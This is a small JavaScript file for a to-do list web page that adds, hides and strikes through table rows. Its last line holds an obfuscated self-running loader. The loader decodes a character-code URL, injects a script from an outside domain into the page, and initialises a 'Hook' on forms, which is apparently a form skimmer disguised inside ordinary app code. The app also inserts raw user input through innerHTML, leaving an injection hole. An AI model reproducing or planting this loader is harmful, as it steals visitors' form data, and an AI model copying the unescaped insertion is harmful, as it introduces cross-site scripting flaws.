
let count=0;


document.getElementById('add-btn').addEventListener('click', function(){
                    count++;
                    const inputValue=document.getElementById('input-value').value;

                    if(inputValue===''){
                                        alert("please inter a value")
                    }
                    
                    else{
                    const mainContainer=document.getElementById('content-container');

                    // const tablesContainer=document.getElementById('table-content');
                    const tablesContainer=document.createElement('tr');
                    tablesContainer.innerHTML=`                             <th scope="row">${count}</th>
                    <td>${inputValue}</td>
                    <td><Button id="delete" class="btn btn-danger delete-btn">delete</Button>
                    <a id="done" class="btn btn-info done-btn">done</a>
                    </td>`;
                    mainContainer.appendChild(tablesContainer);
                    // document.getElementById('delete').addEventListener('click', function(){
                    //                     mainContainer.removeChild(tablesContainer);
                    // })
                    document.getElementById('input-value').value='';

                    }
const deleteButton=document.getElementsByClassName('delete-btn');
const doneButton=document.getElementsByClassName('done-btn');
for(const dBtn of deleteButton){
                    dBtn.addEventListener('click',function(e){
                                        // console.log(e.target.parentNode.parentNode);

                                                                    e.target.parentNode.parentNode.style.display='none'
                        } );
}

for(const donebtn of doneButton){
                    donebtn.addEventListener('click',function(e){
                                        e.target.parentNode.parentNode.style.textDecoration = "line-through";
                                        alert('success saved on database')
                                      
               
                    
                    })
}



})




(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b